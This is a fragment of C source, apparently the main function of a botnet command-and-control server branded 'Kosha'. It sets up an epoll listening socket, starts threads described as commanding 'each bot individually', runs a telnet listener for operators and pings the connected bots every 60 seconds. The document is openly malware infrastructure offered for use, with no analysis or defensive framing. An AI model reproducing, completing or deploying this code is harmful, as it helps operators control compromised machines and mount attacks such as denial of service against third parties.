        if (argc != 4)
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Successfully Screened - Created By [\x1b[0;36mFlexingOnLamers\x1b[1;37m]\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
        broadcast("PING", -1, "STRING");
        sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}